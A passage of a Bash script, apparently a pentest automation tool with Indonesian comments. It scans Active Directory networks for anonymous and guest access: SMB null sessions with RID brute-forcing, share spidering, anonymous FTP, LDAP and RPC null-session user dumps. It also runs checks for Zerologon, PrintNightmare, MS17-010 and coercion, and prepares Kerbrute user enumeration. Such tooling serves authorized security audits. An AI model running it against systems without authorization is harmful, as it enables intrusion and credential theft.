#!/bin/bash

# ====================================================
# NoAuth / Guest / Anonymous Exposure Scanner
# Upgrade:
# - DC detection via LDAP + Kerberos
# - Dynamic domain discovery
# - Conditional Kerbrute: Run ONLY if LDAP/RPC Null Session returns 0 users
# - RPC Null Session check via rpcclient on Port 135
# - Merge LDAP users + RPC users + Kerbrute users
# - ASREP exposure audit via impacket & john cracking
# - Binary-safe LDAP & RPC parsing
# - Full command logging [CMD] for every execution
# ====================================================

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
MAGENTA='\033[1;35m'
NC='\033[0m'

# --- ARGUMENTS ---
TARGET_FILE=${1:-target}
DOMAIN_NAME=${2:-auto}
USERLIST=${3:-/usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt}

KERBRUTE_TIMEOUT=${KERBRUTE_TIMEOUT:-60}
LDAP_TIMEOUT=${LDAP_TIMEOUT:-60}

# Optional env override:
# KERBRUTE_BIN=/usr/local/bin/kerbrute ./script.sh target
KERBRUTE_BIN=${KERBRUTE_BIN:-}

# --- OUTPUT FILES ---
OUTDIR="spray_netexec"
SCAN_FILE="$OUTDIR/nmap_scan.gnmap"
RAW_OUT="$OUTDIR/raw_spray_noauth.txt"
FINAL_OUT="$OUTDIR/final_noauth_summary.txt"
KERBRUTE_STATUS_FILE="$OUTDIR/info_kerbrute_status.txt"
MERGED_USERS_STATUS_FILE="$OUTDIR/info_merged_ldap_kerbrute_users_status.txt"
ASREP_AUDIT_STATUS_FILE="$OUTDIR/info_asrep_audit_status.txt"


mkdir -p "$OUTDIR"
: > "$RAW_OUT"
: > "$KERBRUTE_STATUS_FILE"
: > "$MERGED_USERS_STATUS_FILE"
: > "$ASREP_AUDIT_STATUS_FILE"


SPIDER_CMDS_FILE="$OUTDIR/spider_download_commands.txt"
SPIDER_FINDINGS_FILE="$OUTDIR/spider_interesting_files.txt"

: > "$SPIDER_CMDS_FILE"
: > "$SPIDER_FINDINGS_FILE"


if [[ ! -f "$TARGET_FILE" ]]; then
    echo -e "${YELLOW}[!] Error: File '$TARGET_FILE' tidak ditemukan.${NC}"
    echo -e "${BLUE}[i] Usage:${NC}"
    echo -e "    $0 <target_file> [domain|auto] [userlist]"
    echo
    echo -e "${BLUE}[i] Examples:${NC}"
    echo -e "    $0 target"
    echo -e "    $0 target auto /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
    echo -e "    $0 target corp.com /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
    echo
    echo -e "${BLUE}[i] Optional:${NC}"
    echo -e "    KERBRUTE_TIMEOUT=300 $0 target"
    echo -e "    KERBRUTE_BIN=/usr/local/bin/kerbrute $0 target"
    exit 1
fi


# ====================================================
# HELPER FUNCTIONS
# ====================================================

get_ips_by_port() {
    grep -a " $1/open/" "$SCAN_FILE" 2>/dev/null | awk '{print $2}' | sort -u
}

dn_to_fqdn() {
    echo "$1" | sed -E 's/DC=//g; s/,/./g; s/[[:space:]]//g'
}

fqdn_to_basedn() {
    echo "$1" | awk -F'.' '{
        for (i=1; i<=NF; i++) {
            printf "DC=%s", $i
            if (i<NF) printf ","
        }
        printf "\n"
    }'
}

safe_name() {
    # Mengganti semua karakter selain A-Z, a-z, 0-9, titik (.), strip (-), dan underscore (_) menjadi (_)
    echo "$1" | sed 's/[^A-Za-z0-9._-]/_/g'
}

clean_nxc_file() {
    local file="$1"
    [[ ! -f "$file" ]] && return 0
    LC_ALL=C perl -i -pe 's/\x00//g; s/\r//g' "$file"
}

normalize_user_only_stream() {
    # stdin -> lowercase username only, strip domain and CR, remove blanks
    tr '[:upper:]' '[:lower:]' | \
        sed 's/\r$//' | \
        sed 's/@.*$//' | \
        sed 's/\\.*$//' | \
        awk 'NF'
}

generate_smbclient_command() {

    local ip="$1"
    local share="$2"
    local filepath="$3"

    local filename
    local dirpath

    filename=$(basename "$filepath")
    dirpath=$(dirname "$filepath")

    dirpath=$(echo "$dirpath" | sed 's#^/##')

    echo "smbclient //$ip/$share -N -c 'cd \"$dirpath\"; get \"$filename\"'"
}



find_kerbrute() {
    if [[ -n "$KERBRUTE_BIN" ]]; then
        if [[ -x "$KERBRUTE_BIN" ]]; then
            echo "$KERBRUTE_BIN"
            return 0
        fi

        if command -v "$KERBRUTE_BIN" >/dev/null 2>&1; then
            command -v "$KERBRUTE_BIN"
            return 0
        fi
    fi

    if command -v kerbrute >/dev/null 2>&1; then
        command -v kerbrute
        return 0
    fi

    for kb in \
        /usr/local/bin/kerbrute \
        /usr/bin/kerbrute \
        /root/go/bin/kerbrute \
        /opt/kerbrute/kerbrute \
        /opt/kerbrute_linux_arm64 \
        /opt/kerbrute_linux_amd64
    do
        if [[ -x "$kb" ]]; then
            echo "$kb"
            return 0
        fi
    done

    return 1
}

get_domain_for_dc() {
    local ip="$1"
    local domain=""
    local fqdn=""
    local hostname=""
    local base_dn=""

    # 1. Quick Return jika Domain sudah ditentukan manual
    if [[ -n "$DOMAIN_NAME" && "$DOMAIN_NAME" != "auto" && "$DOMAIN_NAME" != "." ]]; then
        echo "$DOMAIN_NAME"
        return 0
    fi

    # 2. PRIORITAS 1: Ambil via NetExec (NXC SMB) - Paling akurat dapat Hostname & Domain sekaligus
    if command -v nxc >/dev/null 2>&1; then
        local cmd_nxc_smb="nxc smb $ip -u '' -p '' --no-progress"
        echo -e "${MAGENTA}[CMD] $cmd_nxc_smb${NC}" >&2
        
        local nxc_output
        nxc_output=$(timeout 10s nxc smb "$ip" -u '' -p '' --no-progress 2>/dev/null)
        
        # Ekstrak domain & hostname dari banner SMB
        domain=$(echo "$nxc_output" | grep -aoiE 'domain:[[:space:]]*[A-Za-z0-9._-]+' | head -n1 | cut -d':' -f2 | xargs)
        hostname=$(echo "$nxc_output" | grep -aoiE 'name:[[:space:]]*[A-Za-z0-9._-]+' | head -n1 | cut -d':' -f2 | xargs)
        
        if [[ -n "$hostname" && -n "$domain" ]]; then
            fqdn="${hostname}.${domain}"
        fi
    fi

    # 3. PRIORITAS 2 (Fallback): Jika NXC gagal/kosong, baru coba pakai ldapsearch
    if [[ -z "$domain" ]] && command -v ldapsearch >/dev/null 2>&1; then
        local cmd="ldapsearch -x -LLL -H ldap://$ip -s base defaultNamingContext"
        echo -e "${MAGENTA}[CMD] $cmd${NC}" >&2
        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')

        if [[ -z "$base_dn" ]]; then
            base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base namingContexts 2>/dev/null | \
                      awk -F': ' '/^namingContexts: DC=/{print $2; exit}')
        fi

        if [[ -n "$base_dn" ]]; then
            domain=$(dn_to_fqdn "$base_dn")
        fi
    fi

    # 4. Fallback Terakhir: Jika domain ketemu tapi hostname/FQDN tetap kosong
    if [[ -n "$domain" && -z "$fqdn" ]]; then
        # Coba query DNS cepat untuk mencari hostname asli
        local resolved_host
        resolved_host=$(nslookup "$ip" "$ip" 2>/dev/null | awk -F'name = ' '/name =/{print $2}' | cut -d'.' -f1 | xargs)
        
        if [[ -n "$resolved_host" ]]; then
            fqdn="${resolved_host}.${domain}"
        else
            # Gunakan dummy DC01 tanpa tanda strip (-) agar lebih natural
            fqdn="DC01.${domain}"
        fi
    fi

    # Kembalikan hasil dengan format: domain;fqdn
    if [[ -n "$domain" ]]; then
        echo "${domain};${fqdn}"
    else
        echo ""
    fi
}

get_basedn_for_dc() {
    local ip="$1"
    local domain="$2"
    local base_dn=""

    if command -v ldapsearch >/dev/null 2>&1; then
        local cmd="ldapsearch -x -LLL -H ldap://$ip -s base defaultNamingContext"
        echo -e "${MAGENTA}[CMD] $cmd${NC}" >&2
        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')
    fi

    if [[ -z "$base_dn" && -n "$domain" ]]; then
        base_dn=$(fqdn_to_basedn "$domain")
    fi

    echo "$base_dn"
}

# ====================================================
# PRE-FLIGHT
# ====================================================

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PRE-FLIGHT CHECK${NC}"
echo -e "${PURPLE}====================================================${NC}"

if ! command -v nmap >/dev/null 2>&1; then
    echo -e "${RED}[!] nmap not found. Install dulu.${NC}"
    exit 1
fi

if ! command -v nxc >/dev/null 2>&1; then
    echo -e "${RED}[!] nxc/netexec not found. Install dulu.${NC}"
    exit 1
fi

RESOLVED_KERBRUTE="$(find_kerbrute || true)"

if [[ -n "$RESOLVED_KERBRUTE" ]]; then
    echo -e "${GREEN}[+] kerbrute found:${NC} $RESOLVED_KERBRUTE"
else
    echo -e "${YELLOW}[!] kerbrute belum ditemukan. Phase kerbrute akan di-skip jika fallback dibutuhkan.${NC}"
fi

echo -e "${BLUE}[i] Kerbrute timeout:${NC} ${KERBRUTE_TIMEOUT}s"

if [[ ! -f "$USERLIST" ]]; then
    echo -e "${YELLOW}[!] Userlist tidak ditemukan: $USERLIST${NC}"
    echo -e "${YELLOW}[!] Phase kerbrute akan skip kecuali userlist valid diberikan.${NC}"
else
    echo -e "${GREEN}[+] Userlist found:${NC} $USERLIST"
    echo -e "${BLUE}[i] Userlist lines:${NC} $(wc -l < "$USERLIST")"
fi

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 1: MASSIVE EFFICIENT PORT SCANNING${NC}"
echo -e "${PURPLE}====================================================${NC}"

ALL_PORTS="21,22,88,135,389,445,1433,2049,3389,5900,5985"

echo -e "${CYAN}[*] Scanning $ALL_PORTS on all targets...${NC}"

NMAP_CMD="nmap -Pn -n -iL $TARGET_FILE -p $ALL_PORTS --version-intensity 0 -sV --host-timeout 30s --open -oG $SCAN_FILE"
echo -e "${MAGENTA}[CMD] $NMAP_CMD${NC}"

nmap -Pn -n -iL "$TARGET_FILE" \
    -p "$ALL_PORTS" \
    --version-intensity 0 \
    -sV \
    --host-timeout 30s \
    --open \
    -oG "$SCAN_FILE" > /dev/null

echo -e "${GREEN}[+] Scan selesai. Memetakan target aktif per protokol...${NC}"

echo -e "${BLUE}----------------------------------------------------${NC}"

for p in 445 3389 135 5985 1433 22 21 5900 2049 389 88; do
    case $p in
        445) proto="smb";;
        3389) proto="rdp";;
        135) proto="wmi";;
        5985) proto="winrm";;
        1433) proto="mssql";;
        22) proto="ssh";;
        21) proto="ftp";;
        5900) proto="vnc";;
        2049) proto="nfs";;
        389) proto="ldap";;
        88) proto="kerberos";;
    esac

    get_ips_by_port "$p" > "$OUTDIR/active_$proto.txt"
    COUNT=$(wc -l < "$OUTDIR/active_$proto.txt")
    [[ $COUNT -gt 0 ]] && echo -e "${CYAN}[*] $proto:${NC} $COUNT hosts found"
done

echo -e "${BLUE}----------------------------------------------------${NC}"


echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2: DEEP ANONYMOUS/GUEST CHECK (SMB, LDAP, FTP, RPC, NFS)${NC}"
echo -e "${PURPLE}====================================================${NC}"

# ---------------- SMB Testing ----------------

if [[ -s "$OUTDIR/active_smb.txt" ]]; then
    # --- INIT RID OUTPUT FILE ---
    mkdir -p "$OUTDIR"
    : > "$OUTDIR/user_rid_brute.txt"

    SMB_TESTS=(
        "Null Session|-u '' -p ''"
        "Guest Local Auth|-u 'guest' -p '' --local-auth"
        "Guest Domain Auth|-u 'guest' -p ''"
    )

    for entry in "${SMB_TESTS[@]}"; do

        TITLE="${entry%%|*}"
        ARGS="${entry#*|}"

        echo -e "${YELLOW}[*] SMB: Running $TITLE check...${NC}"

        for attempt in {1..2}; do

            CMD="nxc smb $OUTDIR/active_smb.txt $ARGS --users --rid --no-progress"

            echo -e "${MAGENTA}[CMD][Attempt $attempt] $CMD${NC}"

            timeout 100s bash -c "$CMD" > .tmp_res 2>&1

            exit_code=$?

            cat .tmp_res | tee -a "$RAW_OUT"
            if grep -q "SidTypeUser" .tmp_res; then
                echo "[+] Extracting users from RID output..."
                grep "SidTypeUser" .tmp_res | grep -oP '[^\\]+\\\K[^ ]+' | sort -u >> "$OUTDIR/user_rid_brute.txt"
            fi
            sort -u "$OUTDIR/user_rid_brute.txt" -o "$OUTDIR/user_rid_brute.txt"
            echo "[+] RID brute force successfully get $(wc -l < "$OUTDIR/user_rid_brute.txt") user(s)"

            # ====================================
            # TIMEOUT / CONNECTION ISSUE
            # ====================================
            if [[ $exit_code -eq 124 ]] || \
               grep -qiE "Broken Pipe|NETBIOS connection.*timed out|connection.*timed out" .tmp_res; then

                echo -e "${YELLOW}[!] Timeout/Connection issue (attempt $attempt/2)${NC}"

                sleep 2
                continue
            fi

            # ====================================
            # EMPTY RESPONSE
            # ====================================
            if [[ ! -s .tmp_res ]]; then

                echo -e "${YELLOW}[!] Empty response (attempt $attempt/2)${NC}"

                sleep 2
                continue
            fi

            # ====================================
            # INVALID SMB OUTPUT
            # ====================================
            if ! grep -q "SMB" .tmp_res; then

                echo -e "${YELLOW}[!] Invalid SMB response (attempt $attempt/2)${NC}"

                sleep 2
                continue
            fi

            # ====================================
            # SUCCESS
            # ====================================
            break

        done

    done

fi

# ---------------- SMB Spider Plus ----------------
if [[ -s "$OUTDIR/active_smb.txt" ]]; then

    echo -e "${YELLOW}[*] SMB: Spidering readable shares using validated credentials...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        # 1. Variabel biasa (Tanpa keyword 'local' karena berada di luar fungsi)
        auth_args=""
        auth_name=""

        # 2. Ambil semua baris sukses '[+]' khusus untuk IP yang sedang di-loop saat ini
        matched_log=$(grep -a "\[+\]" "$RAW_OUT" 2>/dev/null | grep -i "$ip")

        # 3. DYNAMIC FLOW DETECTION VIA FIXED STRING MATCHING
        # Cek apakah log mengandung '\guest:' secara literal (menggunakan fgrep / grep -F agar bebas dari escape-hell)
        if echo "$matched_log" | grep -qiF '\guest:'; then
            auth_args="-u 'guest' -p ''"
            auth_name="guest"
            
        # Cek apakah log mengandung '\:' secara literal (artinya null session sukses)
        elif echo "$matched_log" | grep -qF '\:'; then
            auth_args="-u '' -p ''"
            auth_name="null_session"
            
        # Jika tidak terekam status sukses di log awal, gunakan Null Session sebagai best-effort fallback
        else
            auth_args="-u '' -p ''"
            auth_name="fallback_null"
        fi

        SPIDER_DIR="$OUTDIR/spider_${ip}_${auth_name}"
        mkdir -p "$SPIDER_DIR"

        SPIDER_CMD="nxc smb $ip $auth_args -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$SPIDER_DIR"

        echo -e "${MAGENTA}[CMD] [Flow-Match: $auth_name] $SPIDER_CMD${NC}"

        # Timeout 150s untuk mitigasi NetBIOSTimeout di infrastructure lab yang lambat
        timeout 150s nxc smb "$ip" \
            $auth_args \
            -M spider_plus \
            -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol DOWNLOAD_FLAG=False \
            OUTPUT_FOLDER="$SPIDER_DIR" \
            2>&1 | tee -a "$RAW_OUT"

        echo -e "${GREEN}[+] Spider enumeration finished for $ip using $auth_name. Output: $SPIDER_DIR${NC}"
        sleep 1

    done < "$OUTDIR/active_smb.txt"
fi


# ---------------- SMB Vulnerability Scanning ----------------

if [[ -s "$OUTDIR/active_smb.txt" ]]; then
    echo -e "\n${YELLOW}[*] SMB: Running Vulnerability and Coercion Checks...${NC}"

    # 1. Cek Multiple Vulnerabilities (MS17-010, Zerologon, PrintNightmare, SMBGhost)
    VULN_CMD="nxc smb $OUTDIR/active_smb.txt -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010"
    echo -e "${MAGENTA}[CMD] $VULN_CMD${NC}"
    
    # Simpan hasil scan ke file temporary untuk parsing
    timeout 60s nxc smb "$OUTDIR/active_smb.txt" \
        -u '' -p '' \
        -M zerologon -M printnightmare -M smbghost -M ms17-010 2>&1 | tee .tmp_vulns | tee -a "$RAW_OUT"

    clean_nxc_file .tmp_vulns

    # Parsing hasil temuan jika ada modul yang mendeteksi kerentanan (biasanya ditandai dengan VULNERABLE atau SUCCESS)
    VULN_LINES=$(grep -ai "VULNERABLE" .tmp_vulns | grep -avi "NOT")

    if [ -n "$VULN_LINES" ]; then
        echo -e "${RED}[!!!] ALERT: Critical SMB Vulnerability Detected! Check details below:${NC}"

        echo "$VULN_LINES" | while read -r line; do
            echo -e "${RED}$line${NC}"
            echo "[!] VULNERABILITY FOUND: $line" >> "$RAW_OUT"
        done
    else
        echo -e "${GREEN}[+] No obvious MS17-010, Zerologon, PrintNightmare, or SMBGhost found.${NC}"
    fi


    # 2. Cek Coercion Method (coerce_plus) untuk melihat potensi AD CS/NTLM Relay Coercion
    COERCE_CMD="nxc smb $OUTDIR/active_smb.txt -u '' -p '' -M coerce_plus"
    echo -e "${MAGENTA}[CMD] $COERCE_CMD${NC}"
    
    timeout 60s nxc smb "$OUTDIR/active_smb.txt" \
        -u '' -p '' \
        -M coerce_plus 2>&1 | tee .tmp_coerce | tee -a "$RAW_OUT"

    clean_nxc_file .tmp_coerce

    # Modul coerce_plus biasanya akan menampilkan "listening" atau detail fungsi coercion jika rentan/bisa di-trigger
    if grep -aqi "vulnerable" .tmp_coerce || grep -aqi "success" .tmp_coerce; then
        echo -e "${RED}[!!!] ALERT: Coercion vulnerability (coerce_plus) detected!${NC}"
        grep -aiE "vulnerable|success" .tmp_coerce | while read -r line; do
            echo -e "${RED}$line${NC}"
        done
    else
        echo -e "${GREEN}[+] No immediate coercion vulnerability via coerce_plus found.${NC}"
    fi

    # Bersihkan file temporary
    rm -f .tmp_vulns .tmp_coerce
fi

# ---------------- FTP Testing + Auto-LS ----------------

if [[ -s "$OUTDIR/active_ftp.txt" ]]; then
    echo -e "${YELLOW}[*] FTP: Checking Anonymous Login & Listing Files...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        echo -e "\n${CYAN}>>> Testing FTP Anonymous: $ip${NC}"

        FTP_CMD="nxc ftp $ip -u 'anonymous' -p '' --ls --no-progress"
        echo -e "${MAGENTA}[CMD] $FTP_CMD${NC}"

        nxc ftp "$ip" \
            -u 'anonymous' -p '' \
            --ls \
            --no-progress 2>&1 | tee .tmp_ftp | tee -a "$RAW_OUT"

        clean_nxc_file .tmp_ftp

        if grep -aq "\[+\]" .tmp_ftp; then
            echo -e "${GREEN}[!] SUCCESS: Anonymous FTP on $ip!${NC}"

            FTP_LOG="$OUTDIR/ftp_files_$ip.txt"
            cp .tmp_ftp "$FTP_LOG"
            clean_nxc_file "$FTP_LOG"

            echo -e "${BLUE}[i] File list saved to $FTP_LOG${NC}"

            if grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"; then
                echo -e "${RED}[!!!] ALERT: Interesting files found on FTP $ip!${NC}"
                grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"
            fi
        fi
    done < "$OUTDIR/active_ftp.txt"

    rm -f .tmp_ftp
fi

# ---------------- LDAP Testing + Null Bind Enumeration ----------------

if [[ -s "$OUTDIR/active_ldap.txt" ]]; then
    echo -e "${YELLOW}[*] LDAP: Checking Null Bind & Enumerating via NXC...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        echo -e "\n${CYAN}>>> Testing LDAP Null Bind: $ip${NC}"

        LDAP_CMD_INIT="nxc ldap $ip -u '' -p '' --no-progress"
        echo -e "${MAGENTA}[CMD] $LDAP_CMD_INIT${NC}"

        nxc ldap "$ip" \
            -u '' -p '' \
            --no-progress 2>&1 | tee .tmp_ldap | tee -a "$RAW_OUT"

        clean_nxc_file .tmp_ldap

        if grep -aq "\[+\]" .tmp_ldap && ! grep -aq "\[-\]" .tmp_ldap; then
            echo -e "${GREEN}[!] SUCCESS: Null Bind found on $ip!${NC}"

            LDAP_DUMP_DIR="$OUTDIR/ldap_nxc_$ip"
            mkdir -p "$LDAP_DUMP_DIR"
            SUMMARY_FILE="$LDAP_DUMP_DIR/summary.txt"

            echo -e "${PURPLE}[EXEC] Collecting Raw Data...${NC}"

            CMD_USERS="nxc ldap $ip -u '' -p '' --users"
            echo -e "${MAGENTA}[CMD] $CMD_USERS${NC}"
            nxc ldap "$ip" -u '' -p '' --users > "$LDAP_DUMP_DIR/users.txt" 2>&1

            CMD_GROUPS="nxc ldap $ip -u '' -p '' --groups"
            echo -e "${MAGENTA}[CMD] $CMD_GROUPS${NC}"
            nxc ldap "$ip" -u '' -p '' --groups > "$LDAP_DUMP_DIR/groups.txt" 2>&1

            CMD_DELEGATION="nxc ldap $ip -u '' -p '' --trusted-for-delegation"
            echo -e "${MAGENTA}[CMD] $CMD_DELEGATION${NC}"
            nxc ldap "$ip" -u '' -p '' --trusted-for-delegation > "$LDAP_DUMP_DIR/delegation.txt" 2>&1

            CMD_POLICY="nxc ldap $ip -u '' -p '' --pass-pol"
            echo -e "${MAGENTA}[CMD] $CMD_POLICY${NC}"
            nxc ldap "$ip" -u '' -p '' --pass-pol > "$LDAP_DUMP_DIR/password_policy.txt" 2>&1

            clean_nxc_file "$LDAP_DUMP_DIR/users.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/groups.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/delegation.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/password_policy.txt"

            echo -e "${PURPLE}[SUMMARY] CREATING ENUMERATION SUMMARY...${NC}"
            echo -e "==== AD ENUMERATION SUMMARY ($ip) ====" > "$SUMMARY_FILE"

            # A. Groups
            echo -e "${PURPLE}[SUMMARY] Extracting Groups...${NC}"
            echo "GroupName;Description;MemberCount" >> "$SUMMARY_FILE"

            TMP_GLIST="$OUTDIR/.tmp_glist_$ip"
            : > "$TMP_GLIST"

            grep -a "LDAP" "$LDAP_DUMP_DIR/groups.txt" | grep -avE "\[\*\]|\[\+\]|\-Group\-" | while read -r line; do
                clean_line=$(echo "$line" | perl -pe 's/^LDAP\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+//')
                count=$(echo "$clean_line" | perl -nE 'say $1 if /\s+(\d+)\s+/')

                if [[ -n "$count" && "$count" -gt 0 ]]; then
                    name=$(echo "$clean_line" | perl -pe "s/\s+$count\s+.*$//" | xargs)
                    desc=$(echo "$clean_line" | perl -pe "s/^.*?$count\s+//" | xargs)

                    if [[ -n "$name" ]]; then
                        echo "$name;$desc;$count" >> "$SUMMARY_FILE"
                        echo "$name" >> "$TMP_GLIST"
                    fi
                fi
            done

            # B. Unconstrained Delegation
            echo -e "\n[Users with Unconstrained Delegation]" >> "$SUMMARY_FILE"

            grep -a "LDAP" "$LDAP_DUMP_DIR/delegation.txt" | grep -avE "\[\*\]|\[\+\]|signing:|channel binding:" | while read -r line; do
                user_del=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//' | xargs)
                [[ -n "$user_del" && ! "$user_del" == *\$ ]] && echo "$user_del" >> "$SUMMARY_FILE"
            done

            # C. Group Membership Mapping
            echo -e "${PURPLE}[MAPPING] Checking Group Members...${NC}"
            echo -e "\n[Group Membership Mapping]" >> "$SUMMARY_FILE"
            echo "GroupName;Members" >> "$SUMMARY_FILE"

            if [[ -f "$TMP_GLIST" ]]; then
                while IFS= read -r gname; do
                    [[ -z "$gname" ]] && continue

                    CMD_GMEMB="nxc ldap $ip -u '' -p '' --groups '$gname' --no-progress"
                    echo -e "${MAGENTA}[CMD] $CMD_GMEMB${NC}" >&2

                    m_list=$(nxc ldap "$ip" \
                        -u '' -p '' \
                        --groups "$gname" \
                        --no-progress 2>/dev/null | \
                        perl -pe 's/\x00//g; s/\r//g' | \
                        grep -a "LDAP" | \
                        grep -avE "\[\*\]|\[\+\]|Members of this group|Description" | \
                        awk '{print $5}' | \
                        xargs | sed 's/ /, /g')

                    m_list=$(echo "$m_list" | sed 's/\[-\]//g' | xargs)

                    if [[ -n "$m_list" && "$m_list" != "members" ]]; then
                        echo "$gname;$m_list" >> "$SUMMARY_FILE"
                    fi
                done < "$TMP_GLIST"

                rm -f "$TMP_GLIST"
            fi

            # D. User Details
            echo -e "\n[User Details]" >> "$SUMMARY_FILE"
            echo "Username;LastPWSet;BadPW;Description" >> "$SUMMARY_FILE"

            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | grep -avE "\[\*\]|\[\+\]|\-Username\-" | while read -r line; do
                u_content=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//')
                u_name=$(echo "$u_content" | awk '{print $1}')
                [[ -z "$u_name" ]] && continue

                if echo "$u_content" | grep -aq "<never>"; then
                    u_pw="never"
                    u_bad=$(echo "$u_content" | awk '{print $3}')
                    u_desc=$(echo "$u_content" | cut -d ' ' -f 4- | xargs)
                else
                    u_pw=$(echo "$u_content" | awk '{print $2" "$3}')
                    u_bad=$(echo "$u_content" | awk '{print $4}')
                    u_desc=$(echo "$u_content" | cut -d ' ' -f 5- | xargs)
                fi

                echo "$u_name;$u_pw;$u_bad;$u_desc" >> "$SUMMARY_FILE"
            done

            # E. Quick LDAP Userlist username-only
            LDAP_USERS_ONLY="$LDAP_DUMP_DIR/users_only_$ip.txt"

            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | \
                grep -vE "\[\*\]|\[\+\]|\[\-\]|Error|operationsError" | \
                awk '{print $NF}' | \
                sed 's/.*\\//' | \
                normalize_user_only_stream | \
                grep -vE '^\s*$|^\[.*\]$' | \
                sort -u > "$LDAP_USERS_ONLY"


            echo -e "${GREEN}[+] Summary and Mapping completed: $SUMMARY_FILE${NC}"
            echo -e "${GREEN}[+] LDAP users saved to: $LDAP_USERS_ONLY${NC}"

        else
            echo -e "${RED}[-] Null Bind failed on $ip.${NC}"
        fi

        rm -f .tmp_ldap
    done < "$OUTDIR/active_ldap.txt"
fi

# ---------------- RPC Testing (Port 135) + Null Session Enum ----------------

if [[ -s "$OUTDIR/active_wmi.txt" ]]; then
    echo -e "${YELLOW}[*] RPC: Checking Null Session on Port 135/139/445...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        echo -e "\n${CYAN}>>> Testing RPC Null Session: $ip${NC}"

        RPC_USER_RAW="$OUTDIR/rpc_users_raw_$ip.txt"
        RPC_USERS_ONLY="$OUTDIR/rpc_users_$ip.txt"

        : > "$RPC_USER_RAW"
        : > "$RPC_USERS_ONLY"

        RPC_CMD="rpcclient $ip -U '' -N -c enumdomusers"
        echo -e "${MAGENTA}[CMD] $RPC_CMD${NC}"

        timeout 15s rpcclient "$ip" -U '' -N -c "enumdomusers" > "$RPC_USER_RAW" 2>/dev/null

        if [[ -s "$RPC_USER_RAW" ]] && grep -q "user:" "$RPC_USER_RAW"; then
            echo -e "${GREEN}[!] SUCCESS: RPC Null Session found on $ip!${NC}"

            cat "$RPC_USER_RAW" | \
                grep -i "user:" | \
                awk -F'[' '{print $2}' | awk -F']' '{print $1}' | \
                normalize_user_only_stream | \
                sort -u > "$RPC_USERS_ONLY"

            USER_COUNT=$(wc -l < "$RPC_USERS_ONLY")
            echo -e "${GREEN}[+] Successfully retrieved $USER_COUNT users via RPC Null Session! Saved to: $RPC_USERS_ONLY${NC}"

            echo "[+] RPC Null Session Success on $ip - Found $USER_COUNT users" >> "$RAW_OUT"
        else
            echo -e "${RED}[-] RPC Null Session failed or returned no users on $ip.${NC}"
            rm -f "$RPC_USER_RAW" "$RPC_USERS_ONLY"
        fi
    done < "$OUTDIR/active_wmi.txt"
fi

# ---------------- NFS Testing ----------------

if [[ -s "$OUTDIR/active_nfs.txt" ]]; then
    echo -e "${YELLOW}[*] NFS: Listing exports...${NC}"
    NFS_CMD="nxc nfs $OUTDIR/active_nfs.txt --no-progress"
    echo -e "${MAGENTA}[CMD] $NFS_CMD${NC}"
    nxc nfs "$OUTDIR/active_nfs.txt" \
        --no-progress 2>&1 | tee -a "$RAW_OUT"
fi


echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.1: DOMAIN CONTROLLER DETECTION + KERBRUTE (Optional)${NC}"
echo -e "${PURPLE}====================================================${NC}"

DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
DC_INFO="$OUTDIR/dc_domain_mapping.txt"

: > "$DC_CANDIDATES"
: > "$DC_INFO"

if [[ -s "$OUTDIR/active_ldap.txt" && -s "$OUTDIR/active_kerberos.txt" ]]; then
    comm -12 "$OUTDIR/active_ldap.txt" "$OUTDIR/active_kerberos.txt" > "$DC_CANDIDATES"
fi

RESOLVED_KERBRUTE="$(find_kerbrute || true)"

if [[ -n "$RESOLVED_KERBRUTE" ]]; then
    echo -e "${GREEN}[+] Kerbrute binary:${NC} $RESOLVED_KERBRUTE"
else
    echo -e "${YELLOW}[!] kerbrute not found. Userenum will be skipped.${NC}"
fi

if [[ -s "$DC_CANDIDATES" ]]; then
    echo -e "${CYAN}[*] Possible Domain Controllers found:${NC}"
    cat "$DC_CANDIDATES"

    while IFS= read -r dc_ip; do
        [[ -z "$dc_ip" ]] && continue

        echo -e "\n${CYAN}>>> Checking DC candidate: $dc_ip${NC}"

        # 1. Panggil fungsi yang mengembalikan format "domain;fqdn"
        discovered_raw=$(get_domain_for_dc "$dc_ip")

        if [[ -z "$discovered_raw" ]]; then
            echo -e "${YELLOW}[!] Could not auto-discover domain for $dc_ip. Skipping kerbrute.${NC}"
            echo "$dc_ip;UNKNOWN;UNKNOWN" >> "$DC_INFO"
